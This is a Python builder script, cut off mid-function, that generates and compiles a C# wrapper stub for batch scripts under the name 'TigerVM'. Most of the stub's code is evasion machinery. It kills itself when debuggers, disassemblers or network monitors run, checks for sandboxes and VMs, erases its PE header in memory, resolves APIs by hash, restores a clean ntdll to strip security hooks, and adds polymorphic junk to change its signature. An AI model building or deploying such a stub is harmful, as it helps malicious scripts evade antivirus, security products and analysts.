"""
builder.py - TigerVM Engine Wrapper Generation & Native CSC Compiler Engine (v5.0 Enterprise)
"""
import os
import sys
import subprocess
import tempfile
import base64
from typing import List, Optional, Dict
from protector import TigerVMCompiler


def find_csc_compiler() -> Optional[str]:
    """
    Finds csc.exe from Windows Microsoft.NET Framework or Path
    """
    candidates = [
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe",
        r"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe",
    ]
    for c in candidates:
        if os.path.exists(c):
            return c

    # Try finding in PATH
    try:
        res = subprocess.run(["where", "csc.exe"], capture_output=True, text=True)
        if res.returncode == 0:
            first_line = res.stdout.strip().splitlines()[0]
            if os.path.exists(first_line):
                return first_line
    except Exception:
        pass
    return None


def generate_manifest(require_admin: bool) -> str:
    """Generates application manifest with execution level"""
    exec_level = "requireAdministrator" if require_admin else "asInvoker"
    return f"""<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="TigerVM.App"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <requestedExecutionLevel level="{exec_level}" uiAccess="false" />
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}}" />
    </application>
  </compatibility>
</assembly>
"""


import random
import string
import struct

def generate_polymorphic_junk() -> str:
    """Generates randomized junk classes and opaque predicates to mutate IL bytecode and entropy."""
    junk_classes = []
    for _ in range(random.randint(3, 5)):
        cname = "JunkBlock_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        mname = "Mutate_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        v1 = random.randint(100, 9999)
        v2 = random.randint(100, 9999)
        junk_classes.append(f"""
    internal static class {cname} {{
        public static long {mname}(long seed) {{
            long acc = seed ^ {v1}L;
            for (int i = 0; i < 3; i++) {{
                acc = (acc * {v2}L) ^ (acc >> 3);
            }}
            return acc;
        }}
    }}""")
    return "\n".join(junk_classes)


def generate_csharp_source(
    b64_bytecode: str,
    b64_key: str,
    sha256_seal: str,
    opcode_map: Dict[int, int],
    hidden: bool,
    enable_armor: bool,
    enable_cff: bool,
    enable_anti_vm: bool,
    embedded_files: Dict[str, str],  # filename -> base64 content
    metadata: Dict[str, str],
    enable_jit: bool = True,
    enable_unhook: bool = True,
    enable_cyberpunk: bool = False,
) -> str:
    """
    Generates C# source code for the standalone TigerVM v6.0-ULTRA Zero-Disk executable stub.
    """
    title = metadata.get("title", "Batch Application")
    description = metadata.get("description", "Compiled TigerVM Application")
    company = metadata.get("company", "tigergenz")
    product = metadata.get("product", "TigerVM Hardened Executable")
    copyright_text = metadata.get("copyright", "Copyright (C) tigergenz")
    version = metadata.get("version", "6.0.0.0")

    # Build embedded files dictionary code
    embedded_files_code = []
    for fname, b64_content in embedded_files.items():
        embedded_files_code.append(f'            EmbeddedFiles["{fname}"] = "{b64_content}";')
    embedded_files_block = "\n".join(embedded_files_code)

    # Build opcode inverse map
    opmap_lines = []
    for raw_op, mapped_byte in opcode_map.items():
        opmap_lines.append(f"            _opMap[{mapped_byte}] = {raw_op};")
    opmap_block = "\n".join(opmap_lines)

    show_window_code = "ProcessWindowStyle.Hidden" if hidden else "ProcessWindowStyle.Normal"
    create_no_window = "true" if hidden else "false"

    anti_vm_code = """
                // Anti-VM & Sandbox Evasion
                if (Environment.ProcessorCount < 2) Terminate();
                string[] vmProcesses = new string[] {
                    "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "qemu-ga",
                    "sandboxiedcomlaunch", "sandboxierpcss", "joeboxserver"
                };
                foreach (Process p in Process.GetProcesses()) {
                    try {
                        string pName = p.ProcessName.ToLowerInvariant();
                        foreach (string bad in vmProcesses) {
                            if (pName == bad || pName.Contains(bad)) Terminate();
                        }
                    } catch { }
                }
    """ if enable_anti_vm else ""

    unhook_call = "TigerArmor.ReloadPristineNtdll();" if enable_unhook else ""

    armor_class = f"""
    public static class TigerArmor {{
        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationThread(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, int threadInformationLength);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        public static void HideThread() {{
            try {{
                NtSetInformationThread(GetCurrentThread(), 0x11 /* ThreadHideFromDebugger */, IntPtr.Zero, 0);
            }} catch {{ }}
        }}

        public static void CloakPeHeader() {{
            try {{
                IntPtr baseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
                uint oldProtect;
                if (VirtualProtect(baseAddress, (UIntPtr)4096, 0x04 /* PAGE_READWRITE */, out oldProtect)) {{
                    byte[] zeroes = new byte[4096];
                    Marshal.Copy(zeroes, 0, baseAddress, 4096);
                    VirtualProtect(baseAddress, (UIntPtr)4096, oldProtect, out oldProtect);
                }}
            }} catch {{ }}
        }}

        public static uint HashDjb2(string str) {{
            uint hash = 5381;
            foreach (char c in (str ?? "")) {{
                hash = ((hash << 5) + hash) + (byte)c;
            }}
            return hash;
        }}

        public static IntPtr ResolveApiByHash(string moduleName, uint targetHash) {{
            try {{
                IntPtr hMod = GetModuleHandleA(moduleName);
                if (hMod == IntPtr.Zero) return IntPtr.Zero;
                int e_lfanew = Marshal.ReadInt32(hMod, 0x3C);
                int optHeaderOffset = e_lfanew + 24;
                short magic = Marshal.ReadInt16(hMod, optHeaderOffset);
                int exportRva = (magic == 0x20B)
                    ? Marshal.ReadInt32(hMod, optHeaderOffset + 112)
                    : Marshal.ReadInt32(hMod, optHeaderOffset + 96);
                if (exportRva == 0) return IntPtr.Zero;

                IntPtr pExport = new IntPtr(hMod.ToInt64() + exportRva);
                int numNames = Marshal.ReadInt32(pExport, 24);
                int funcRva = Marshal.ReadInt32(pExport, 28);
                int nameRva = Marshal.ReadInt32(pExport, 32);
                int ordinalRva = Marshal.ReadInt32(pExport, 36);

                IntPtr pFunctions = new IntPtr(hMod.ToInt64() + funcRva);
                IntPtr pNames = new IntPtr(hMod.ToInt64() + nameRva);
                IntPtr pOrdinals = new IntPtr(hMod.ToInt64() + ordinalRva);

                for (int i = 0; i < numNames; i++) {{
                    int curNameRva = Marshal.ReadInt32(pNames, i * 4);
                    IntPtr pCurName = new IntPtr(hMod.ToInt64() + curNameRva);
                    string name = Marshal.PtrToStringAnsi(pCurName);
                    if (HashDjb2(name) == targetHash) {{
                        short ordinal = Marshal.ReadInt16(pOrdinals, i * 2);
                        int targetFuncRva = Marshal.ReadInt32(pFunctions, ordinal * 4);
                        return new IntPtr(hMod.ToInt64() + targetFuncRva);
                    }}
                }}
            }} catch {{ }}
            return IntPtr.Zero;
        }}

        public static bool ReloadPristineNtdll() {{
            try {{
                string sysDir = Environment.SystemDirectory;
                string ntdllDiskPath = Path.Combine(sysDir, "ntdll.dll");
                if (!File.Exists(ntdllDiskPath)) return false;

                byte[] diskBytes = File.ReadAllBytes(ntdllDiskPath);
                IntPtr hNtdll = GetModuleHandleA("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return false;

                int e_lfanew = BitConverter.ToInt32(diskBytes, 0x3C);
                short numSections = BitConverter.ToInt16(diskBytes, e_lfanew + 6);
                short optHeaderSize = BitConverter.ToInt16(diskBytes, e_lfanew + 20);
                int sectionHeaderStart = e_lfanew + 24 + optHeaderSize;

                for (int i = 0; i < numSections; i++) {{
                    int secOffset = sectionHeaderStart + (i * 40);
                    string secName = Encoding.ASCII.GetString(diskBytes, secOffset, 8).TrimEnd('\\0');
                    if (secName == ".text") {{
                        int virtualAddress = BitConverter.ToInt32(diskBytes, secOffset + 12);
                        int sizeOfRawData = BitConverter.ToInt32(diskBytes, secOffset + 16);
                        int pointerToRawData = BitConverter.ToInt32(diskBytes, secOffset + 20);

                        IntPtr targetMem = new IntPtr(hNtdll.ToInt64() + virtualAddress);
                        uint oldProtect;
                        if (VirtualProtect(targetMem, (UIntPtr)sizeOfRawData, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect)) {{
                            Marshal.Copy(diskBytes, pointerToRawData, targetMem, sizeOfRawData);
                            VirtualProtect(targetMem, (UIntPtr)sizeOfRawData, oldProtect, out oldProtect);
                            return true;
                        }}
                    }}
                }}
            }} catch {{ }}
            return false;
        }}

        public static void StartRaspWatchdog() {{
            try {{
                System.Threading.Thread watchdog = new System.Threading.Thread(() => {{
                    while (true) {{
                        try {{
                            HideThread();
                            if (Debugger.IsAttached || IsDebuggerPresent()) Terminate();
                            bool remoteDbg = false;
                            if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remoteDbg) && remoteDbg) {{
                                Terminate();
                            }}
                        }} catch {{ }}
                        System.Threading.Thread.Sleep(600);
                    }}
                }});
                watchdog.IsBackground = true;
                watchdog.Start();
            }} catch {{ }}
        }}

        public static void VerifyEnvironment() {{
            try {{
                HideThread();
                {unhook_call}
                StartRaspWatchdog();
                CloakPeHeader();
                if (Debugger.IsAttached) Terminate();
                if (IsDebuggerPresent()) Terminate();
                bool remoteDbg = false;
                if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remoteDbg) && remoteDbg) {{
                    Terminate();
                }}

                string[] exactList = new string[] {{ "ida", "ida64", "idag", "idag64" }};
                string[] subList = new string[] {{
                    "dnspy", "x64dbg", "x32dbg", "procmon", "procmon64",
                    "processhacker", "cheatengine", "wireshark", "fiddler",
                    "httpdebugger", "scylla", "pe-sieve"
                }};

                foreach (Process p in Process.GetProcesses()) {{
                    try {{
                        string pName = p.ProcessName.ToLowerInvariant();
                        foreach (string ex in exactList) {{
                            if (pName == ex || pName.StartsWith(ex + ".")) {{
                                Terminate();
                            }}
                        }}
                        foreach (string bad in subList) {{
                            if (pName.Contains(bad)) {{
                                Terminate();
                            }}
                        }}
                    }} catch {{ }}
                }}
{anti_vm_code}
            }} catch {{ }}
        }}

        private static void Terminate() {{
            try {{
                Process.GetCurrentProcess().Kill();
            }} catch {{
                Environment.Exit(0xDEAD);
            }}
        }}
    }}
"""

    armor_call = "            TigerArmor.VerifyEnvironment();" if enable_armor else ""
    polymorphic_junk = generate_polymorphic_junk()

    # CFF Loop Headers
    if enable_cff:
        cff_init_loop = """
            int curState = instrs.Count > 0 ? instrs[0].StateId : 0xDEAD;
            while (curState != 0xDEAD && stateToIp.ContainsKey(curState)) {
                ip = stateToIp[curState];
        """
        cff_goto_body = "if (labels.ContainsKey(target)) { curState = instrs[labels[target]].StateId; continue; }"
        cff_callsub_body = """
                            callStack.Push(inst.NextStateId);
                            Variables["1"] = subParam;
                            curState = instrs[labels[subTarget]].StateId;
                            continue;
        """
        cff_return_body = "if (callStack.Count > 0) { curState = callStack.Pop(); continue; }"
        cff_if_match_body = """
                        if (match) {
                            bool branched = false;
                            ExecuteSubCommand(a3, labels, instrs, ref ip, ref curState, ref branched);
                            if (branched) continue;
                        }
        """
        cff_if_exist_body = """
                        if (ex) {
                            bool branched = false;
                            ExecuteSubCommand(a2, labels, instrs, ref ip, ref curState, ref branched);
                            if (branched) continue;
                        }
        """
        cff_if_def_body = """
                        if (def) {
                            bool branched = false;
                            ExecuteSubCommand(a2, labels, instrs, ref ip, ref curState, ref branched);
                            if (branched) continue;
                        }
        """
        cff_if_el_body = """
                        if (elOk) {
                            bool branched = false;
                            ExecuteSubCommand(a2, labels, instrs, ref ip, ref curState, ref branched);
                            if (branched) continue;
                        }
        """
        cff_for_num_call = "ExecuteSubCommand(expBody, labels, instrs, ref ip, ref dummyState, ref dummyBranch);"
        cff_for_file_call = "ExecuteSubCommand(expFBody, labels, instrs, ref ip, ref dummyState, ref dummyBranch);"
        cff_for_token_call = "ExecuteSubCommand(expTBody, labels, instrs, ref ip, ref dummyState, ref dummyBranch);"
        cff_catch_skip = "curState = frame[3]; continue;"
        cff_loop_end = """
                curState = inst.NextStateId;
            }
        """
        subcmd_sig = "private static void ExecuteSubCommand(string cmd, Dictionary<string, int> labels, List<VmCode> instrs, ref int ip, ref int curState, ref bool branched)"
        subcmd_goto = "if (labels.ContainsKey(tgt)) { curState = instrs[labels[tgt]].StateId; branched = true; return; }"
    else:
        cff_init_loop = """
            while (ip < instrs.Count) {
        """
        cff_goto_body = "if (labels.ContainsKey(target)) { ip = labels[target]; continue; }"
        cff_callsub_body = """
                            callStack.Push(ip + 1);
                            Variables["1"] = subParam;
                            ip = labels[subTarget];
                            continue;
        """
        cff_return_body = "if (callStack.Count > 0) { ip = callStack.Pop(); continue; }"
        cff_if_match_body = "if (match) ExecuteSubCommand(a3, labels, ref ip);"
        cff_if_exist_body = "if (ex) ExecuteSubCommand(a2, labels, ref ip);"
        cff_if_def_body = "if (def) ExecuteSubCommand(a2, labels, ref ip);"
        cff_if_el_body = "if (elOk) ExecuteSubCommand(a2, labels, ref ip);"
        cff_for_num_call = "ExecuteSubCommand(expBody, labels, ref ip);"
        cff_for_file_call = "ExecuteSubCommand(expFBody, labels, ref ip);"
        cff_for_token_call = "ExecuteSubCommand(expTBody, labels, ref ip);"
        cff_catch_skip = "ip = frame[1]; continue;"
        cff_loop_end = """
                ip++;
            }
        """
        subcmd_sig = "private static void ExecuteSubCommand(string cmd, Dictionary<string, int> labels, ref int ip)"
        subcmd_goto = "if (labels.ContainsKey(tgt)) { ip = labels[tgt] - 1; return; }"

    cs_code = f"""// Auto-generated by TigerGenZ Bat Compiler & TigerVM v6.0-ULTRA Enterprise Engine
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.IO.Compression;

[assembly: AssemblyTitle("{title}")]
[assembly: AssemblyDescription("{description}")]
[assembly: AssemblyCompany("{company}")]
[assembly: AssemblyProduct("{product}")]
[assembly: AssemblyCopyright("{copyright_text}")]
[assembly: AssemblyVersion("{version}")]
[assembly: AssemblyFileVersion("{version}")]

namespace TigerVmApp
{{
{armor_class}
{polymorphic_junk}

    public static class NativeJit
    {{
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long JittedFunc64();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int JittedFunc32();

        public static long Eval(string expr, Dictionary<string, string> vars)
        {{
            if (string.IsNullOrEmpty(expr)) return 0;
            try
            {{
                bool is64 = IntPtr.Size == 8;
                List<byte> code = new List<byte>();

                string clean = expr.Trim();
                if (vars != null)
                {{
                    foreach (var kv in vars)
                    {{
                        if (!string.IsNullOrEmpty(kv.Key) && (char.IsLetter(kv.Key[0]) || kv.Key[0] == '_'))
                        {{
                            clean = Regex.Replace(clean, @"\\b" + Regex.Escape(kv.Key) + @"\\b", string.IsNullOrEmpty(kv.Value) ? "0" : kv.Value);
                        }}
                    }}
                }}

                var tokens = Regex.Matches(clean, @"([0-9]+)|([+\\-*\\/^%&|])");
                if (tokens.Count == 0) return 0;

                long initialVal = 0;
                long.TryParse(tokens[0].Value, out initialVal);

                if (is64)
                {{
                    code.Add(0x48); code.Add(0xB8);
                    code.AddRange(BitConverter.GetBytes(initialVal));

                    int i = 1;
                    while (i < tokens.Count - 1)
                    {{
                        string op = tokens[i].Value;
                        long operand = 0;
                        long.TryParse(tokens[i + 1].Value, out operand);

                        code.Add(0x48); code.Add(0xB9);
                        code.AddRange(BitConverter.GetBytes(operand));

                        if (op == "+") code.AddRange(new byte[] {{ 0x48, 0x01, 0xC8 }});
                        else if (op == "-") code.AddRange(new byte[] {{ 0x48, 0x29, 0xC8 }});
                        else if (op == "*") code.AddRange(new byte[] {{ 0x48, 0x0F, 0xAF, 0xC1 }});
                        else if (op == "/") code.AddRange(new byte[] {{ 0x48, 0x85, 0xC9, 0x74, 0x05, 0x48, 0x99, 0x48, 0xF7, 0xF9 }});
                        else if (op == "%") code.AddRange(new byte[] {{ 0x48, 0x85, 0xC9, 0x74, 0x08, 0x48, 0x99, 0x48, 0xF7, 0xF9, 0x48, 0x89, 0xD0 }});
                        else if (op == "^") code.AddRange(new byte[] {{ 0x48, 0x31, 0xC8 }});
                        else if (op == "&") code.AddRange(new byte[] {{ 0x48, 0x21, 0xC8 }});
                        else if (op == "|") code.AddRange(new byte[] {{ 0x48, 0x09, 0xC8 }});
                        i += 2;
                    }}
                    code.Add(0xC3);
                }}
                else
                {{
                    code.Add(0xB8);
                    code.AddRange(BitConverter.GetBytes((int)initialVal));

                    int i = 1;
                    while (i < tokens.Count - 1)
                    {{
                        string op = tokens[i].Value;
                        int operand = 0;
                        int.TryParse(tokens[i + 1].Value, out operand);

                        code.Add(0xB9);
                        code.AddRange(BitConverter.GetBytes(operand));

                        if (op == "+") code.AddRange(new byte[] {{ 0x01, 0xC8 }});
                        else if (op == "-") code.AddRange(new byte[] {{ 0x29, 0xC8 }});
                        else if (op == "*") code.AddRange(new byte[] {{ 0x0F, 0xAF, 0xC1 }});
                        else if (op == "/") code.AddRange(new byte[] {{ 0x85, 0xC9, 0x74, 0x03, 0x99, 0xF7, 0xF9 }});
                        else if (op == "%") code.AddRange(new byte[] {{ 0x85, 0xC9, 0x74, 0x05, 0x99, 0xF7, 0xF9, 0x89, 0xD0 }});
                        else if (op == "^") code.AddRange(new byte[] {{ 0x31, 0xC8 }});
                        else if (op == "&") code.AddRange(new byte[] {{ 0x21, 0xC8 }});
                        else if (op == "|") code.AddRange(new byte[] {{ 0x09, 0xC8 }});
                        i += 2;
                    }}
                    code.Add(0xC3);
                }}

                byte[] nativeBytes = code.ToArray();
                IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)nativeBytes.Length, 0x3000, 0x40);
                if (buf == IntPtr.Zero) return 0;

                Marshal.Copy(nativeBytes, 0, buf, nativeBytes.Length);
                long result = 0;
                if (is64)
                {{
                    JittedFunc64 fn = (JittedFunc64)Marshal.GetDelegateForFunctionPointer(buf, typeof(JittedFunc64));
                    result = fn();
                }}
                else
                {{
                    JittedFunc32 fn = (JittedFunc32)Marshal.GetDelegateForFunctionPointer(buf, typeof(JittedFunc32));
                    result = fn();
                }}
                VirtualFree(buf, UIntPtr.Zero, 0x8000);
                return result;
            }}
            catch
            {{
                try
                {{
                    var dt = new System.Data.DataTable();
                    var res = dt.Compute(expr, "");
                    return Convert.ToInt64(res);
                }}
                catch {{ return 0; }}
            }}
        }}
    }}

    public static class WinApiGateway
    {{
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F0();
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F1(IntPtr a1);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F2(IntPtr a1, IntPtr a2);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F3(IntPtr a1, IntPtr a2, IntPtr a3);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F4(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F5(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F6(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F7(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6, IntPtr a7);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F8(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6, IntPtr a7, IntPtr a8);

        public static long Invoke(string dllName, string funcName, string rawArgs, Dictionary<string, string> vars)
        {{
            List<IntPtr> allocs = new List<IntPtr>();
            try
            {{
                IntPtr hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) return -1;
                IntPtr pFunc = IntPtr.Zero;
                try {{ pFunc = TigerArmor.ResolveApiByHash(dllName, TigerArmor.HashDjb2(funcName)); }} catch {{ }}
                if (pFunc == IntPtr.Zero) pFunc = GetProcAddress(hMod, funcName);
                if (pFunc == IntPtr.Zero) return -2;

                List<string> argsList = new List<string>();
                var matches = Regex.Matches(rawArgs, "\\\"[^\\\"]*\\\"|[^ ]+");
                foreach (Match m in matches)
                {{
                    argsList.Add(m.Value.Trim('\\\"'));
                }}

                bool isWide = funcName.EndsWith("W", StringComparison.OrdinalIgnoreCase);
                IntPtr[] ptrs = new IntPtr[argsList.Count];
                for (int i = 0; i < argsList.Count; i++)
                {{
                    string s = argsList[i];
                    long num;
                    if (long.TryParse(s, out num))
                    {{
                        ptrs[i] = new IntPtr(num);
                    }}
                    else if (s.StartsWith("0x", StringComparison.OrdinalIgnoreCase) && long.TryParse(s.Substring(2), System.Globalization.NumberStyles.HexNumber, null, out num))
                    {{
                        ptrs[i] = new IntPtr(num);
                    }}
                    else
                    {{
                        IntPtr pStr = isWide ? Marshal.StringToHGlobalUni(s) : Marshal.StringToHGlobalAnsi(s);
                        allocs.Add(pStr);
                        ptrs[i] = pStr;
                    }}
                }}

                IntPtr ret = IntPtr.Zero;
                switch (ptrs.Length)
                {{
                    case 0: ret = ((F0)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F0)))(); break;
                    case 1: ret = ((F1)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F1)))(ptrs[0]); break;
                    case 2: ret = ((F2)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F2)))(ptrs[0], ptrs[1]); break;
                    case 3: ret = ((F3)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F3)))(ptrs[0], ptrs[1], ptrs[2]); break;
                    case 4: ret = ((F4)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F4)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3]); break;
                    case 5: ret = ((F5)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F5)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4]); break;
                    case 6: ret = ((F6)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F6)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4], ptrs[5]); break;
                    case 7: ret = ((F7)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F7)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4], ptrs[5], ptrs[6]); break;
                    case 8: ret = ((F8)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F8)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4], ptrs[5], ptrs[6], ptrs[7]); break;
                    default: return -3;
                }}
                return ret.ToInt64();
            }}
            catch {{ return -99; }}
            finally
            {{
                foreach (IntPtr p in allocs)
                {{
                    try {{ Marshal.FreeHGlobal(p); }} catch {{ }}
                }}
            }}
        }}
    }}

    public static class TigerHud
    {{
        public static void RenderBanner(string title, string subtitle)
        {{
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(new string('=', 64));
            Console.Write(" [TigerVM] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(title);
            if (!string.IsNullOrEmpty(subtitle))
            {{
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("          " + subtitle);
            }}
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(new string('=', 64));
            Console.ResetColor();
        }}

        public static void RenderProgress(int pct, string label)
        {{
            pct = Math.Max(0, Math.Min(100, pct));
            int barWidth = 24;
            int filled = (pct * barWidth) / 100;
            Console.Write("\\r ");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("[");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write(new string('#', filled));
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write(new string('-', barWidth - filled));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("] ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write(pct.ToString().PadLeft(3) + "% ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(label.PadRight(28));
            Console.ResetColor();
            if (pct >= 100) Console.WriteLine();
        }}

        public static void RenderMatrix(int lines)
        {{
            Random r = new Random();
            string chars = "0123456789ABCDEF!@#$%&*?+";
            for (int l = 0; l < lines; l++)
            {{
                StringBuilder sb = new StringBuilder();
                for (int c = 0; c < 60; c++)
                {{
                    sb.Append(r.Next(0, 4) == 0 ? chars[r.Next(chars.Length)] : ' ');
                }}
                Console.ForegroundColor = (l % 2 == 0) ? ConsoleColor.Green : ConsoleColor.DarkGreen;
                Console.WriteLine("  " + sb.ToString());
                System.Threading.Thread.Sleep(15);
            }}
            Console.ResetColor();
        }}

        public static void RenderSpinner(int durationMs, string label)
        {{
            char[] spinChars = new[] {{ '|', '/', '-', '\\\\' }};
            int delay = 80;
            int count = Math.Max(1, durationMs / delay);
            for (int i = 0; i < count; i++)
            {{
                Console.Write("\\r ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("[" + spinChars[i % spinChars.Length] + "] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(label);
                Console.ResetColor();
                System.Threading.Thread.Sleep(delay);
            }}
            Console.Write("\\r ");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[OK] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(label);
            Console.ResetColor();
        }}

        public static void RenderTable(string rawData)
        {{
            try
            {{
                if (string.IsNullOrEmpty(rawData)) return;
                string[] rows = rawData.Split('|');
                if (rows.Length == 0) return;
                List<string[]> table = new List<string[]>();
                int maxCols = 0;
                foreach (string r in rows)
                {{
                    string[] cols = r.Split(',');
                    for (int c = 0; c < cols.Length; c++) cols[c] = cols[c].Trim().Trim((char)34, (char)39);
                    table.Add(cols);
                    if (cols.Length > maxCols) maxCols = cols.Length;
                }}
                int[] colWidths = new int[maxCols];
                for (int c = 0; c < maxCols; c++)
                {{
                    int w = 4;
                    foreach (var row in table)
                    {{
                        if (c < row.Length && row[c].Length > w) w = row[c].Length;
                    }}
                    colWidths[c] = w + 2;
                }}
                Action<char, char, char> printBorder = (left, mid, right) =>
                {{
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.Write("  " + left);
                    for (int c = 0; c < maxCols; c++)
                    {{
                        Console.Write(new string('-', colWidths[c]));
                        if (c < maxCols - 1) Console.Write(mid);
                    }}
                    Console.WriteLine(right);
                    Console.ResetColor();
                }};
                printBorder('+', '+', '+');
                for (int r = 0; r < table.Count; r++)
                {{
                    Console.Write("  ");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.Write("|");
                    var row = table[r];
                    for (int c = 0; c < maxCols; c++)
                    {{
                        string val = (c < row.Length) ? row[c] : "";
                        if (r == 0) Console.ForegroundColor = ConsoleColor.Yellow;
                        else Console.ForegroundColor = ConsoleColor.White;
                        Console.Write(" " + val.PadRight(colWidths[c] - 1));
                        Console.ForegroundColor = ConsoleColor.DarkCyan;
                        Console.Write("|");
                    }}
                    Console.WriteLine();
                    Console.ResetColor();
                    if (r == 0) printBorder('+', '+', '+');
                }}
                printBorder('+', '+', '+');
            }}
            catch {{ }}
        }}
    }}

    public static class TigerGui
    {{
        public static string ShowMsgBox(string title, string text, string options)
        {{
            try
            {{
                string[] parts = (options ?? "").Split('|');
                string btnStr = parts.Length > 0 ? parts[0].Trim() : "OK";
                string iconStr = parts.Length > 1 ? parts[1].Trim() : "Info";

                System.Windows.Forms.MessageBoxButtons buttons = System.Windows.Forms.MessageBoxButtons.OK;
                if (btnStr.Equals("OKCancel", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.OKCancel;
                else if (btnStr.Equals("YesNo", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.YesNo;
                else if (btnStr.Equals("YesNoCancel", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.YesNoCancel;
                else if (btnStr.Equals("RetryCancel", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.RetryCancel;

